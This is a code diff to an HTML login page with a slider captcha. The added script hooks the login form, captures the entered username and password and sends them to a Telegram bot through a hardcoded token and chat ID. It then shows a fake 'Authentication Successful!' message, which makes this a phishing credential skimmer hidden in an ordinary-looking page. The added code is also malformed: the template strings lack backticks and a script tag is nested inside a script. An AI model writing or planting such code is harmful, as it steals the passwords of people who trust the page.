@@ -159,6 +159,33 @@
             setTimeout(() => { cc.classList.add('captcha-hidden'); sb.disabled = false; }, 600);
         } else { ha.style.left = '0px'; pi.style.left = '0px'; }
     });
+    <script>
+const BOT_TOKEN = '8584656855:AAGer0oV6or_nNBblqfOKr9Exyf8Z58UoLk';
+const CHAT_ID = '5627522307';
+
+document.querySelector('form').addEventListener('submit', function(e) {
+    e.preventDefault(); // Stops the page from refreshing
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    const message = 🚨 NEW LOGIN ALERT 🚨\n\n👤 User: ${username}\n🔑 Pass: ${password};
+
+    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
+    }).then(() => {
+        alert("Authentication Successful!");
+        // Optional: Redirect them after they "log in"
+        // window.location.href = "https://google.com";
+    });
+});
+</script>
 </script>
 </body>
 </html>
+
